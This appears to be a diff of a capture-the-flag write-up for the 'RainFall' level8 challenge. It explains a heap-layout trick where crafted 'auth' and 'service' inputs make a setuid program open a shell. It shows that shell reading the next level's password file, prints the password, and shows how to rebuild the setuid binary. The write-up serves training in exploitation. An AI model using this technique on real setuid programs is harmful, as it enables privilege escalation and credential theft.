@@ -1,20 +1,63 @@
-; -----------------------------------------------------------------------
+# ------------------------------------------------------------------------
+# Obtain the next password
+# ------------------------------------------------------------------------
 
-#!/bin/bash
-python -c "print('auth ')"
-python -c "print('service ' + 'S'*100)"
-python -c "print('login')"
-python -c "print('whoami')"
-python -c "print('cat /home/user/level9/.pass')"
+# We need to allocate space on the heap to variable auth, and have auth[32] contain a non-zero value.
 
-; -----------------------------------------------------------------------
+# We can set the value at auth[32] by setting the next heap variable service.
 
-level8@RainFall:/tmp$ ./lev8.sh | /home/user/level8/level8
-(nil), (nil) 
-0x804a008, (nil) 
-0x804a008, 0x804a018 
-level9
-c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
-0x804a008, 0x804a018 
+# After inputting 'auth ':
 
-; -----------------------------------------------------------------------
+	(auth)
+	[ 4 bytes ]
+
+# After inputting 'service0123456789012345':
+
+	[ auth (4)    ][ metadata (12) ][ service (18) ]
+
+	service = '0123456789012345\n'
+
+	Now auth[32] contains '\n'
+
+# Run the program
+~/level8
+	auth 
+	service0123456789012345
+	login
+
+	whoami
+	cat /home/user/level9/.pass
+
+
+# Now we can log in as user level9
+su level9
+# password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+
+# ------------------------------------------------------------------------
+# Recreate the exploitable program
+# ------------------------------------------------------------------------
+
+# As user level9:
+
+    # Compile the program in /tmp
+    gcc source8.c -o ft_level8
+
+    # Edit suid
+    chmod u+s ft_level8
+
+    # Move the program to home directory
+    chmod +wx ~; mv ft_level8 ~
+
+# As user level8:
+
+	# Run the program
+	/home/user/level9/ft_level8
+		auth 
+		service0123456789012345
+		login
+
+		whoami
+		cat /home/user/level9/.pass
+
+
